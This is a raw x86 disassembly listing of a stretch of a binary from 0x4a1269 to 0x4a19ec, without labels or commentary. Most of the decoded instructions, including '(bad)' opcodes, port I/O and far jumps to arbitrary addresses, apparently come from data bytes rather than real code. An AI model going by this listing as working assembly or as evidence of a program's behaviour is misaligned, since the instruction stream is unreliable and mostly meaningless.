  4a1269:	cmp    DWORD PTR [eax],ebx
  4a126b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a126c:	pushf  
  4a126d:	pushf  
  4a126e:	popf   
  4a126f:	or     BYTE PTR [ecx+0xe],bh
  4a1272:	and    DWORD PTR [eax],esp
  4a1274:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a1275:	sahf   
  4a1276:	sahf   
  4a1277:	inc    ebx
  4a1278:	dec    eax
  4a1279:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4a127b:	lahf   
  4a127c:	sub    BYTE PTR [esi+0x195210a0],ah
  4a1282:	inc    edx
  4a1283:	lods   al,BYTE PTR ds:[esi]
  4a1284:	mov    eax,ds:0xe7908654
  4a1289:	xor    BYTE PTR [edi+0x21a3b4a2],ah
  4a128f:	in     al,0x39
  4a1291:	test   BYTE PTR [eax],bh
  4a1293:	test   al,0xa4
  4a1295:	jns    0x4a12a5
  4a1297:	and    DWORD PTR [ebp-0x56bf5a44],edx
  4a129d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a129e:	inc    ebx
  4a129f:	dec    eax
  4a12a0:	gs or  ah,al
  4a12a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a12a4:	dec    eax
  4a12a5:	push   edx
  4a12a6:	sbb    DWORD PTR [edx-0x62],eax
  4a12a9:	stos   BYTE PTR es:[edi],al
  4a12aa:	test   al,0xcc
  4a12ac:	test   eax,0x10e79086
  4a12b1:	push   eax
  4a12b2:	stos   DWORD PTR es:[edi],eax
  4a12b3:	stos   BYTE PTR es:[edi],al
  4a12b4:	aam    0xe4
  4a12b6:	cmp    DWORD PTR [esp+edx*2-0x5353a755],eax
  4a12bd:	push   cs
  4a12be:	and    DWORD PTR [ebp+0x60addc21],edx
  4a12c4:	lods   eax,DWORD PTR ds:[esi]
  4a12c5:	dec    eax
  4a12c6:	or     BYTE PTR gs:[ecx-0x52],bh
  4a12ca:	in     al,0xaf
  4a12cc:	sbb    DWORD PTR [edx-0x62],eax
  4a12cf:	inc    ebx
  4a12d0:	push   0x90ecb0ae
  4a12d5:	out    0x10,eax
  4a12d7:	push   edx
  4a12d8:	mov    cl,0x70
  4a12da:	scas   eax,DWORD PTR es:[edi]
  4a12db:	mov    dl,0x39
  4a12dd:	test   BYTE PTR [esi+eax*4-0xc],dl
  4a12e1:	mov    bl,0x78
  4a12e3:	mov    al,0x21
  4a12e5:	xchg   ebp,eax
  4a12e6:	and    esp,esp
  4a12e8:	mov    ah,0xfc
  4a12ea:	mov    ch,0x73
  4a12ec:	or     BYTE PTR [ecx+0xe],bh
  4a12ef:	xor    BYTE PTR [ecx+0x42b204b6],0x2a
  4a12f6:	inc    ebx
  4a12f7:	enter  0x88b7,0xb8
  4a12fb:	retf   0xf210
  4a12fe:	sbb    al,0xc
  4a1300:	mov    bl,0xb9
  4a1302:	nop
  4a1303:	test   BYTE PTR [edi+eax*4],bh
  4a1306:	nop
  4a1307:	mov    edx,0xcfbbb414
  4a130c:	and    DWORD PTR [edx+esi*1-0x4ae34368],esp
  4a1313:	mov    ebp,0x210ca908
  4a1318:	mov    al,ds:0xc8432abe
  4a131d:	jae    0x4a1343
  4a131f:	mov    dh,0xbf
  4a1321:	test   al,0xc0
  4a1323:	adc    dl,dh
  4a1325:	sbb    al,0x42
  4a1327:	sub    al,0xb7
  4a1329:	sar    DWORD PTR [edi+eax*4],0x90
  4a132d:	retf   0xc2b0
  4a1330:	xor    al,0xb8
  4a1332:	ret    
  4a1333:	and    DWORD PTR [edx+esi*1-0x563b477c],esp
  4a133a:	or     al,0x21
  4a133c:	iret   
  4a133d:	cmp    al,0xb9
  4a133f:	vshufps xmm0,xmm7,XMMWORD PTR [ebx-0x38],0x73
  4a1345:	or     BYTE PTR [edx+edi*4-0x39],al
  4a1349:	enter  0x1cf2,0x42
  4a134d:	sub    cl,al
  4a134f:	dec    esp
  4a1350:	mov    ebx,0xca9087c9
  4a1355:	adc    al,dl
  4a1357:	retf   0xbc54
  4a135a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a135b:	xor    al,BYTE PTR [esp+edi*1+0xcccd8cb]
  4a1362:	and    edi,ecx
  4a1364:	and    DWORD PTR [ebp+edi*4-0x33],ebx
  4a1368:	loopne 0x4a1332
  4a136a:	jae    0x4a1374
  4a136c:	test   eax,0xcfbe64ce
  4a1371:	sbb    al,0x42
  4a1373:	sub    al,BYTE PTR [ebx-0x18]
  4a1376:	shr    BYTE PTR [edi+edi*4-0x70],1
  4a137a:	retf   0xf210
  4a137d:	shl    eax,1
  4a137f:	shl    BYTE PTR [edx],cl
  4a1381:	test   BYTE PTR [edi+eax*4],bh
  4a1384:	je     0x4a1346
  4a1386:	sar    eax,cl
  4a1388:	and    edi,ecx
  4a138a:	and    DWORD PTR [esp+edx*8+0x65d5c17c],esp
  4a1391:	or     BYTE PTR [ecx+0xe],bh
  4a1394:	add    dl,al
  4a1396:	(bad)  
  4a1397:	test   BYTE PTR [edx-0x62],al
  4a139a:	inc    ebx
  4a139b:	dec    eax
  4a139c:	xlat   BYTE PTR ds:[ebx]
  4a139d:	or     bl,al
  4a139f:	fsub   st,st(7)
  4a13a1:	adc    BYTE PTR [edx+0x19],dl
  4a13a4:	mov    ecx,ds
  4a13a6:	adc    ah,al
  4a13a8:	test   BYTE PTR [esi+eax*4-0x70],dl
  4a13ac:	ficom  DWORD PTR [ebx+ebx*8+0x39e42195]
  4a13b3:	sbb    ch,al
  4a13b5:	fcomp  QWORD PTR [ebp+ebx*8+0x210e7908]
  4a13bc:	and    dh,al
  4a13be:	ficomp WORD PTR [esi-0x5b9ab7bd]
  4a13c4:	fild   QWORD PTR [eax]
  4a13c6:	(bad)  
  4a13c7:	loopne 0x4a13d9
  4a13c9:	push   edx
  4a13ca:	sbb    DWORD PTR [edx-0x54],eax
  4a13cd:	loope  0x4a1423
  4a13cf:	xchg   BYTE PTR [eax-0x1d37cf19],dl
  4a13d5:	mov    ah,0xe3
  4a13d7:	and    esp,esp
  4a13d9:	cmp    DWORD PTR [eax+edi*1+0xe79e4c9],eax
  4a13e0:	and    DWORD PTR [ebp-0x35bf1a44],edx
  4a13e6:	out    0x43,al
  4a13e8:	dec    eax
  4a13e9:	gs or  ah,al
  4a13ec:	out    0x48,eax
  4a13ee:	push   edx
  4a13ef:	sbb    DWORD PTR [edx-0x62],eax
  4a13f2:	retf   
  4a13f3:	call   0x90d0fdc4
  4a13f8:	out    0x10,eax
  4a13fa:	push   eax
  4a13fb:	int3   
  4a13fc:	jmp    0xeb54:0x8439e4d4
  4a1403:	pop    eax
  4a1404:	int    0xec
  4a1406:	push   cs
  4a1407:	and    DWORD PTR [ebp+0x60eddc21],edx
  4a140d:	into   
  4a140e:	dec    eax
  4a140f:	or     BYTE PTR gs:[ecx-0x12],bh
  4a1413:	in     al,0xef
  4a1415:	sbb    DWORD PTR [edx-0x62],eax
  4a1418:	inc    ebx
  4a1419:	push   0x90ecf0cf
  4a141e:	out    0x10,eax
  4a1420:	push   edx
  4a1421:	icebp  
  4a1422:	jo     0x4a13f4
  4a1424:	repnz cmp DWORD PTR [esp+edx*2+0x78f3f486],eax
  4a142c:	shl    DWORD PTR [ecx],1
  4a142e:	xchg   ebp,eax
  4a142f:	and    esp,esp
  4a1431:	hlt    
  4a1432:	cld    
  4a1433:	cmc    
  4a1434:	jae    0x4a143e
  4a1436:	jns    0x4a1446
  4a1438:	adc    dl,0xf6
  4a143b:	add    al,0xd3
  4a143d:	inc    edx
  4a143e:	sub    al,BYTE PTR [ebx-0x38]
  4a1441:	test   DWORD PTR [eax-0xdef3508],0xf9d40c1c
  4a144b:	nop
  4a144c:	test   BYTE PTR [edi+eax*4],bh
  4a144f:	nop
  4a1450:	cli    
  4a1451:	adc    al,0xd5
  4a1453:	sti    
  4a1454:	iret   
  4a1455:	and    DWORD PTR [edx+esi*1-0x29e30368],esp
  4a145c:	std    
  4a145d:	or     BYTE PTR [ecx-0x15fdef4],ch
  4a1463:	sub    eax,DWORD PTR [ebx-0x38]
  4a1466:	jae    0x4a148c
  4a1468:	xlat   BYTE PTR ds:[ebx]
  4a1469:	jmp    FWORD PTR [eax+0x79080300]
  4a146f:	pop    esi
  4a1470:	and    BYTE PTR [eax+ebx*8],ch
  4a1473:	add    DWORD PTR [esi-0x4f9ab7bd],ebx
  4a1479:	add    dh,BYTE PTR [ecx+ebx*8]
  4a147c:	add    edx,DWORD PTR [eax]
  4a147e:	push   edx
  4a147f:	sbb    DWORD PTR [edx-0x48],eax
  4a1482:	add    al,0x54
  4a1484:	xchg   BYTE PTR [eax+0x5da3ce7],dl
  4a148a:	rol    BYTE PTR [esi],0x21
  4a148d:	in     al,0x39
  4a148f:	test   BYTE PTR [ebx+ebx*8+0x7],al
  4a1493:	jns    0x4a14a3
  4a1495:	and    DWORD PTR [ebp-0x23b3f738],edx
  4a149b:	or     DWORD PTR [ebx+0x48],eax
  4a149e:	gs or  al,dl
  4a14a1:	or     dl,BYTE PTR [edx+edx*2+0x19]
  4a14a5:	inc    edx
  4a14a6:	sahf   
  4a14a7:	fisttp QWORD PTR [ebx]
  4a14a9:	fmul   DWORD PTR [esi+eax*4]
  4a14ac:	nop
  4a14ad:	out    0x10,eax
  4a14af:	pop    esp
  4a14b0:	fimul  WORD PTR ds:0x8439e4e0
  4a14b6:	push   esp
  4a14b7:	push   cs
  4a14b8:	fisttp WORD PTR fs:[edi]
  4a14bb:	push   cs
  4a14bc:	and    DWORD PTR [ebp+0x6c10e821],edx
  4a14c2:	loopne 0x4a150c
  4a14c4:	or     BYTE PTR gs:[ecx+0x11],bh
  4a14c8:	lock adc bl,BYTE PTR [ecx]
  4a14cb:	inc    edx
  4a14cc:	sahf   
  4a14cd:	inc    ebx
  4a14ce:	je     0x4a14b1
  4a14d0:	adc    edi,eax
  4a14d2:	nop
  4a14d3:	out    0x10,eax
  4a14d5:	push   edx
  4a14d6:	adc    al,0x7c
  4a14d8:	loop   0x4a14ef
  4a14da:	xor    al,BYTE PTR [esp+edi*1+0x16e30087]
  4a14e1:	test   BYTE PTR [ecx],ah
  4a14e3:	iret   
  4a14e4:	and    DWORD PTR [edi+edx*1+0x7318e408],esp
  4a14eb:	or     BYTE PTR [ecx+0x10198c0c],ch
  4a14f1:	in     eax,0x42
  4a14f3:	sub    al,BYTE PTR [ebx-0x38]
  4a14f6:	sbb    dl,BYTE PTR [ebx+ebx*1+0x1cf210ca]
  4a14fd:	sbb    dh,ah
  4a14ff:	sbb    al,0x9c
  4a1501:	test   BYTE PTR [edi+eax*4],bh
  4a1504:	nop
  4a1505:	sbb    eax,0xcf1ee720
  4a150a:	and    DWORD PTR [edx+esi*1-0x17d7e05c],esp
  4a1511:	and    BYTE PTR [eax],cl
  4a1513:	test   eax,0x21ac210c
  4a1518:	sub    al,BYTE PTR [ebx-0x38]
  4a151b:	jae    0x4a154d
  4a151d:	jmp    0x106dc944
  4a1522:	repnz sbb al,0x42
  4a1525:	cmp    dl,ch
  4a1527:	and    al,0x3c
  4a1529:	xchg   DWORD PTR [eax+0x4025bcca],edx
  4a152f:	jmp    0x4a1557
  4a1531:	and    DWORD PTR [edx+esi*1-0x56d83b7c],esp
  4a1538:	or     al,0x21
  4a153a:	iret   
  4a153b:	dec    eax
  4a153c:	in     al,dx
  4a153d:	sub    ah,cl
  4a153f:	sub    DWORD PTR [ebx-0x38],eax
  4a1542:	jae    0x4a154c
  4a1544:	push   eax
  4a1545:	in     eax,dx
  4a1546:	sub    dl,ah
  4a1548:	repnz sbb al,0x42
  4a154b:	sub    ch,BYTE PTR [ebx]
  4a154d:	pop    eax
  4a154e:	out    dx,al
  4a154f:	sub    al,0x87
  4a1551:	nop
  4a1552:	retf   0xdc10
  4a1555:	sub    eax,0x32a4ef60
  4a155a:	test   BYTE PTR [esi+ebp*1],bh
  4a155d:	in     al,0x2f
  4a155f:	or     al,0x21
  4a1561:	iret   
  4a1562:	and    DWORD PTR [eax-0x10],ebp
  4a1565:	xor    ah,ch
  4a1567:	enter  0x873,0xa9
  4a156b:	xor    DWORD PTR [eax-0xf],esi
  4a156e:	xor    bl,BYTE PTR [edx+eax*2]
  4a1571:	sub    al,BYTE PTR [ebx-0xc]
  4a1574:	xor    edi,DWORD PTR [eax-0xe]
  4a1577:	nop
  4a1578:	retf   0xf210
  4a157b:	xor    al,0xfc
  4a157d:	xor    eax,0x873c8439
  4a1582:	xor    bl,0x36
  4a1585:	add    al,0xf4
  4a1587:	and    DWORD PTR [ebp-0x77c81bdf],edx
  4a158d:	cmp    BYTE PTR [ebp+0x8],ah
  4a1590:	jns    0x4a15a0
  4a1592:	or     al,0xf5
  4a1594:	cmp    DWORD PTR [eax+0x48439e42],edx
  4a159a:	cmp    dl,BYTE PTR [esi+esi*8]
  4a159d:	cmp    esp,edi
  4a159f:	adc    BYTE PTR [edx+0x19],dl
  4a15a2:	cwde   
  4a15a3:	cmp    al,0x1c
  4a15a5:	test   DWORD PTR [esp+edx*2-0x5fc26f7a],0xe421953e
  4a15b0:	cmp    DWORD PTR [eax+edi*8],esp
  4a15b3:	aas    
  4a15b4:	test   al,0x40
  4a15b6:	or     BYTE PTR [ecx+0xe],bh
  4a15b9:	and    DWORD PTR [ecx+edi*8],ebp
  4a15bc:	inc    ecx
  4a15bd:	sahf   
  4a15be:	inc    ebx
  4a15bf:	dec    eax
  4a15c0:	gs mov al,0x42
  4a15c3:	xor    al,0xfa
  4a15c5:	inc    ebx
  4a15c6:	adc    BYTE PTR [edx+0x19],dl
  4a15c9:	inc    edx
  4a15ca:	mov    eax,0x90865444
  4a15cf:	out    0x3c,eax
  4a15d1:	sti    
  4a15d2:	inc    ebp
  4a15d3:	rol    BYTE PTR [esi+0x21],0xe4
  4a15d7:	cmp    DWORD PTR [esp+eax*2+0xe7947fc],eax
  4a15de:	and    DWORD PTR [ebp-0x2b3b738],edx
  4a15e4:	dec    ecx
  4a15e5:	inc    ebx
  4a15e6:	dec    eax
  4a15e7:	gs or  al,dl
  4a15ea:	dec    edx
  4a15eb:	push   esp
  4a15ec:	push   edx
  4a15ed:	sbb    DWORD PTR [edx-0x62],eax
  4a15f0:	dec    BYTE PTR [ebx-0x28]
  4a15f3:	dec    esp
  4a15f4:	xchg   BYTE PTR [eax-0xa3ef19],dl
  4a15fa:	dec    ebp
  4a15fb:	loopne 0x4a15cf
  4a15fd:	cmp    al,0x84
  4a15ff:	push   esp
  4a1600:	dec    esi
  4a1601:	add    BYTE PTR fs:[edx+0x4f],al
  4a1605:	xchg   DWORD PTR [eax+0x50e810ca],edx
  4a160b:	ins    BYTE PTR es:[edi],dx
  4a160c:	add    DWORD PTR [edx+esi*1-0xfaec37c],esp
  4a1613:	push   edx
  4a1614:	or     al,0x21
  4a1616:	iret   
  4a1617:	and    DWORD PTR [edx+eax*1+0x53],esi
  4a161b:	clc    
  4a161c:	enter  0x873,0xa9
  4a1620:	push   esp
  4a1621:	jl     0x4a1626
  4a1623:	push   ebp
  4a1624:	sbb    DWORD PTR [edx-0x62],eax
  4a1627:	inc    ebx
  4a1628:	add    BYTE PTR [esi+edx*2],al
  4a162b:	test   BYTE PTR [eax+0x575210e7],dl
  4a1631:	or     BYTE PTR ds:0x54843958,al
  4a1637:	xchg   BYTE PTR [ecx+ebx*2-0x6adef9f0],cl
  4a163e:	and    esp,esp
  4a1640:	pop    edx
  4a1641:	xchg   esp,eax
  4a1642:	pop    ebx
  4a1643:	or     BYTE PTR gs:[ecx+0xe],bh
  4a1647:	sbb    BYTE PTR [edi],al
  4a1649:	pop    esp
  4a164a:	pushf  
  4a164b:	inc    edx
  4a164c:	sahf   
  4a164d:	inc    ebx
  4a164e:	dec    eax
  4a164f:	pop    ebp
  4a1650:	and    BYTE PTR [eax],cl
  4a1652:	pop    esi
  4a1653:	out    0x10,eax
  4a1655:	push   edx
  4a1656:	sbb    DWORD PTR [edi+ebx*2+0x54840928],esp
  4a165d:	xchg   BYTE PTR [eax-0x6a9e53a0],dl
  4a1663:	and    esp,esp
  4a1665:	cmp    DWORD PTR [eax],esi
  4a1667:	or     ah,BYTE PTR [edx-0x4c]
  4a166a:	arpl   WORD PTR [eax],cx
  4a166c:	jns    0x4a167c
  4a166e:	and    DWORD PTR [eax],edi
  4a1670:	or     esp,DWORD PTR [esi+ebx*4+0x43]
  4a1674:	dec    eax
  4a1675:	gs mov esp,0x660c4065
  4a167b:	adc    BYTE PTR [edx+0x19],dl
  4a167e:	inc    edx
  4a167f:	les    esp,FWORD PTR [edi+0x54]
  4a1682:	xchg   BYTE PTR [eax+0x680d48e7],dl
  4a1688:	int3   
  4a1689:	imul   esp,DWORD PTR [ecx],0x508439e4
  4a168f:	push   cs
  4a1690:	push   0x79
  4a1692:	push   cs
  4a1693:	and    DWORD PTR [ebp+0xf586bd4],edx
  4a1699:	ins    BYTE PTR es:[edi],dx
  4a169a:	inc    ebx
  4a169b:	dec    eax
  4a169c:	gs or  ah,bl
  4a169f:	ins    DWORD PTR es:[edi],dx
  4a16a0:	pusha  
  4a16a1:	push   edx
  4a16a2:	sbb    DWORD PTR [edx-0x62],eax
  4a16a5:	adc    BYTE PTR [esi-0x1c],ch
  4a16a8:	outs   dx,DWORD PTR ds:[esi]
  4a16a9:	xchg   BYTE PTR [eax+0x116810e7],dl
  4a16af:	jo     0x4a169d
  4a16b1:	in     al,0x39
  4a16b3:	test   BYTE PTR [ecx+esi*2+0x70],dl
  4a16b7:	adc    dh,BYTE PTR [edx+0xe]
  4a16ba:	and    DWORD PTR [ebp+0x7873f421],edx
  4a16c0:	adc    ecx,DWORD PTR [eax+0x65]
  4a16c3:	or     BYTE PTR [ecx+0x74],bh
  4a16c6:	cld    
  4a16c7:	jne    0x4a16e5
  4a16c9:	inc    edx
  4a16ca:	sahf   
  4a16cb:	inc    ebx
  4a16cc:	adc    BYTE PTR [esi+esi*2],0x4
  4a16d0:	adc    eax,0xf210ca90
  4a16d5:	ja     0x4a165f
  4a16d7:	js     0x4a170b
  4a16d9:	test   BYTE PTR [edi+eax*4],bh
  4a16dc:	or     al,0x16
  4a16de:	jns    0x4a1670
  4a16e0:	and    edi,ecx
  4a16e2:	and    DWORD PTR [edx+edi*2+0x737b1714],esp
  4a16e9:	or     BYTE PTR [ecx+0x1c7c980c],ch
  4a16ef:	sbb    BYTE PTR [edx+0x2a],al
  4a16f2:	inc    ebx
  4a16f3:	enter  0xa07d,0x7e
  4a16f7:	retf   0xf210
  4a16fa:	sbb    al,0x24
  4a16fc:	sbb    DWORD PTR [edi-0x58],edi
  4a16ff:	test   BYTE PTR [edi+eax*4],bh
  4a1702:	nop
  4a1703:	sub    BYTE PTR [edx+ebx*1],0x81
  4a1707:	iret   
  4a1708:	and    DWORD PTR [edx+esi*1+0x1b3482b0],esp
  4a170f:	or     DWORD PTR [eax],0xffffffa9
  4a1712:	or     al,0x21
  4a1714:	mov    eax,0xc8432a84
  4a1719:	jae    0x4a1757
  4a171b:	sbb    al,0x85
  4a171d:	rol    BYTE PTR [esi+0x421cf210],0x44
  4a1724:	sbb    eax,0x90873c87
  4a1729:	retf   0x88c8
  4a172c:	dec    esp
  4a172d:	push   ds
  4a172e:	mov    DWORD PTR [ecx],esp
  4a1730:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a1731:	xor    al,BYTE PTR [eax+edx*8+0x210ca98a]
  4a1738:	iret   
  4a1739:	push   esp
  4a173a:	pop    ds
  4a173b:	mov    ebx,eax
  4a173d:	mov    WORD PTR [ebx-0x38],es
  4a1740:	jae    0x4a174a
  4a1742:	pop    esp
  4a1743:	and    BYTE PTR [ebp+0x1310cde0],cl
  4a1749:	sub    cl,BYTE PTR [esi+0x108f21ff]
  4a174f:	ror    BYTE PTR [ecx+eiz*1],cl
  4a1752:	and    DWORD PTR [eax-0x32def32e],edx
  4a1758:	and    dl,BYTE PTR [ecx+0x210c9222]
  4a175e:	int    0x10
  4a1760:	and    edx,DWORD PTR [ebx+0x10cd2123]
  4a1766:	rcl    BYTE PTR [esp-0x2def326b],cl
  4a176d:	or     al,0x25
  4a176f:	xchg   esi,eax
  4a1770:	and    eax,0xcd21097
  4a1775:	and    DWORD PTR [esi],esp
  4a1777:	cwde   
  4a1778:	ror    BYTE PTR [ecx+eiz*1],cl
  4a177b:	int    0x26
  4a177d:	cdq    
  4a177e:	daa    
  4a177f:	call   0x9b27:0x10cd210c
  4a1786:	sub    BYTE PTR [ecx],ah
  4a1788:	int    0x10
  4a178a:	rcr    BYTE PTR [eax+ebp*1-0x2def3263],cl
  4a1791:	or     al,0x29
  4a1793:	sahf   
  4a1794:	sub    DWORD PTR [edi+0x210cd210],ebx
  4a179a:	sub    ah,BYTE PTR [eax-0x32def32e]
  4a17a0:	sub    ah,BYTE PTR [ecx+0x210ca22b]
  4a17a6:	int    0x10
  4a17a8:	sub    esp,DWORD PTR [ebx+0x10cd212c]
  4a17ae:	shl    BYTE PTR [esp+ebp*1-0x2def325b],cl
  4a17b5:	or     al,0x2d
  4a17b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a17b8:	sub    eax,0xcd210a7
  4a17bd:	and    DWORD PTR [esi],ebp
  4a17bf:	test   al,0xd2
  4a17c1:	or     al,0x21
  4a17c3:	int    0x2e
  4a17c5:	test   eax,0x210caa2f
  4a17ca:	int    0x10
  4a17cc:	das    
  4a17cd:	stos   DWORD PTR es:[edi],eax
  4a17ce:	xor    BYTE PTR [ecx],ah
  4a17d0:	int    0x10
  4a17d2:	shr    BYTE PTR [eax+esi*1-0x2def3253],cl
  4a17d9:	or     al,0x31
  4a17db:	scas   al,BYTE PTR es:[edi]
  4a17dc:	xor    DWORD PTR [edi+0x210cd210],ebp
  4a17e2:	xor    dh,BYTE PTR [eax-0x32def32e]
  4a17e8:	xor    dh,BYTE PTR [ecx+0x210cb233]
  4a17ee:	int    0x10
  4a17f0:	xor    esi,DWORD PTR [ebx+0x10cd2134]
  4a17f6:	shl    BYTE PTR [esp+esi*1-0x2def324b],cl
  4a17fd:	or     al,0x35
  4a17ff:	mov    dh,0x36
  4a1801:	mov    bh,0x10
  4a1803:	ror    BYTE PTR [ecx+eiz*1],cl
  4a1806:	ss mov eax,0xcd210cd2
  4a180c:	aaa    
  4a180d:	mov    ecx,0x210cba37
  4a1812:	int    0x10
  4a1814:	cmp    BYTE PTR [ebx+0x10cd2138],bh
  4a181a:	sar    BYTE PTR [ecx+edi*1-0x2def3243],cl
  4a1821:	or     al,0x39
  4a1823:	mov    esi,0xd210bf3a
  4a1828:	or     al,0x21
  4a182a:	cmp    al,al
  4a182c:	ror    BYTE PTR [ecx+eiz*1],cl
  4a182f:	int    0x3b
  4a1831:	sar    DWORD PTR [ebx],0xc2
  4a1834:	or     al,0x21
  4a1836:	int    0x10
  4a1838:	cmp    al,0xc3
  4a183a:	cmp    al,0x21
  4a183c:	int    0x10
  4a183e:	rol    ah,cl
  4a1840:	cmp    eax,0xd210cdc5
  4a1845:	or     al,0x3d
  4a1847:	(bad)  
  4a1848:	ds (bad) 
  4a184a:	adc    dl,dl
  4a184c:	or     al,0x21
  4a184e:	ds enter 0xcd2,0x21
  4a1853:	int    0x3f
  4a1855:	leave  
  4a1856:	aas    
  4a1857:	retf   0x210c
  4a185a:	int    0x10
  4a185c:	inc    eax
  4a185d:	retf   
  4a185e:	inc    eax
  4a185f:	and    ebp,ecx
  4a1861:	adc    dl,dl
  4a1863:	int3   
  4a1864:	inc    ecx
  4a1865:	int    0xcd
  4a1867:	adc    dl,dl
  4a1869:	or     al,0x41
  4a186b:	into   
  4a186c:	inc    edx
  4a186d:	iret   
  4a186e:	adc    dl,dl
  4a1870:	or     al,0x21
  4a1872:	inc    edx
  4a1873:	rcl    dl,1
  4a1875:	or     al,0x21
  4a1877:	int    0x43
  4a1879:	rol    DWORD PTR [ebx-0x2e],1
  4a187c:	or     al,0x21
  4a187e:	int    0x10
  4a1880:	inc    esp
  4a1881:	rol    DWORD PTR [ecx+eiz*1-0x33],cl
  4a1885:	adc    dl,dl
  4a1887:	aam    0x45
  4a1889:	aad    0xcd
  4a188b:	adc    dl,dl
  4a188d:	or     al,0x46
  4a188f:	(bad)  
  4a1890:	inc    esi
  4a1891:	xlat   BYTE PTR ds:[ebx]
  4a1892:	adc    dl,dl
  4a1894:	or     al,0x21
  4a1896:	inc    edi
  4a1897:	fcom   st(2)
  4a1899:	or     al,0x21
  4a189b:	int    0x47
  4a189d:	(bad)  [eax-0x26]
  4a18a0:	or     al,0x21
  4a18a2:	int    0x10
  4a18a4:	dec    eax
  4a18a5:	fisttp DWORD PTR [ecx+0x21]
  4a18a8:	int    0x10
  4a18aa:	rcr    ah,cl
  4a18ac:	dec    ecx
  4a18ad:	(bad)  
  4a18af:	adc    dl,dl
  4a18b1:	or     al,0x4a
  4a18b3:	fimul  WORD PTR [edx-0x21]
  4a18b6:	adc    dl,dl
  4a18b8:	or     al,0x21
  4a18ba:	dec    ebx
  4a18bb:	loopne 0x4a188f
  4a18bd:	or     al,0x21
  4a18bf:	int    0x4b
  4a18c1:	loope  0x4a190f
  4a18c3:	loop   0x4a18d1
  4a18c5:	and    ebp,ecx
  4a18c7:	adc    BYTE PTR [ebx+eiz*8+0x4d],cl
  4a18cb:	and    ebp,ecx
  4a18cd:	adc    dl,dl
  4a18cf:	in     al,0x4d
  4a18d1:	in     eax,0x95
  4a18d3:	and    esp,esp
  4a18d5:	or     eax,0xc4e63a4e
  4a18da:	out    0x36,eax
  4a18dc:	lock xchg esp,eax
  4a18de:	sub    al,0x5e
  4a18e0:	pop    ebp
  4a18e1:	ret    
  4a18e2:	inc    edx
  4a18e3:	dec    eax
  4a18e4:	adc    eax,0x4f486db6
  4a18e9:	or     al,0xe8
  4a18eb:	enter  0x873,0xe9
  4a18ef:	cmp    ebp,ecx
  4a18f1:	push   eax
  4a18f2:	push   eax
  4a18f3:	jmp    0xebd4:0x432a421c
  4a18fa:	pop    eax
  4a18fb:	push   ecx
  4a18fc:	nop
  4a18fd:	retf   0xf210
  4a1900:	in     al,dx
  4a1901:	fsub   st(5),st
  4a1903:	xor    al,BYTE PTR [esp+edi*1-0x11ad9f79]
  4a190a:	in     al,0x21
  4a190c:	iret   
  4a190d:	and    DWORD PTR [edi+ebp*8+0x73f05368],esp
  4a1914:	or     BYTE PTR [ecx+0x70f1ec0c],ch
  4a191a:	push   esp
  4a191b:	inc    edx
  4a191c:	sub    al,BYTE PTR [ebx-0x38]
  4a191f:	repnz hlt 
  4a1921:	repz retf 0xf210
  4a1925:	sbb    al,0x78
  4a1927:	push   ebp
  4a1928:	hlt    
  4a1929:	cld    
  4a192a:	test   BYTE PTR [edi+eax*4],bh
  4a192d:	nop
  4a192e:	cmc    
  4a192f:	adc    BYTE PTR [esi-0xa],0x95
  4a1933:	and    esp,esp
  4a1935:	cmp    DWORD PTR [edi+edx*2],eax
  4a1938:	test   DWORD PTR [eax+0xe7908f8],0xf9580c21
  4a1942:	sahf   
  4a1943:	inc    ebx
  4a1944:	dec    eax
  4a1945:	gs nop
  4a1947:	cli    
  4a1948:	adc    al,0x59
  4a194a:	sti    
  4a194b:	adc    BYTE PTR [edx+0x19],dl
  4a194e:	inc    edx
  4a194f:	cwde   
  4a1950:	cld    
  4a1951:	push   esp
  4a1952:	xchg   BYTE PTR [eax-0x2a5e319],dl
  4a1958:	mov    al,ds:0x39e421fe
  4a195d:	test   BYTE PTR [ebx+ebx*2],ah
  4a1960:	(bad)  
  4a1961:	cmp    al,0x2f
  4a1963:	nop
  4a1964:	xchg   ebp,eax
  4a1965:	test   al,0x0
  4a1967:	add    al,0x2c
  4a1969:	pop    esp
  4a196a:	add    DWORD PTR [ecx],esp
  4a196c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a196d:	xor    al,BYTE PTR [eax+esi*4+0x210ca902]
  4a1974:	iret   
  4a1975:	xor    al,0x5d
  4a1977:	add    edi,DWORD PTR [eax+0x73c84304]
  4a197d:	or     BYTE PTR [esi+ebx*2],bh
  4a1980:	add    eax,0x421cf2c0
  4a1985:	sub    al,BYTE PTR [esi]
  4a1987:	inc    esp
  4a1988:	pop    edi
  4a1989:	pop    es
  4a198a:	xchg   DWORD PTR [eax+0x8c810ca],edx
  4a1990:	dec    esp
  4a1991:	pusha  
  4a1992:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a1993:	xor    al,BYTE PTR [esp+edi*1+0xc0ad009]
  4a199a:	and    edi,ecx
  4a199c:	and    DWORD PTR [ecx+eiz*2+0xb],edx
  4a19a0:	fmul   st,st(0)
  4a19a2:	jae    0x4a19ac
  4a19a4:	test   eax,0xd625c0c
  4a19a9:	sbb    al,0x42
  4a19ab:	sub    al,BYTE PTR [ebx-0x20]
  4a19ae:	push   cs
  4a19af:	arpl   WORD PTR fs:[eax+0xff210ca],dx
  4a19b6:	call   0x3cce4bcb
  4a19bb:	xchg   DWORD PTR [esp+eiz*2+0x11],ebp
  4a19bf:	lock and edi,ecx
  4a19c2:	and    DWORD PTR [edx+edx*1+0x73136574],esp
  4a19c9:	or     BYTE PTR [ecx+0x7c14f80c],ch
  4a19cf:	inc    dx
  4a19d1:	sahf   
  4a19d2:	inc    ebx
  4a19d3:	enter  0x15,0x67
  4a19d7:	push   ss
  4a19d8:	out    0x10,eax
  4a19da:	push   edx
  4a19db:	sbb    DWORD PTR [edi+edx*1+0x54846808],eax
  4a19e2:	xchg   BYTE PTR [eax-0x6ae673e8],dl
  4a19e8:	and    esp,esp
  4a19ea:	cmp    DWORD PTR [eax],edx
  4a19ec:	imul   ebx,DWORD PTR [edx],0x79081b94
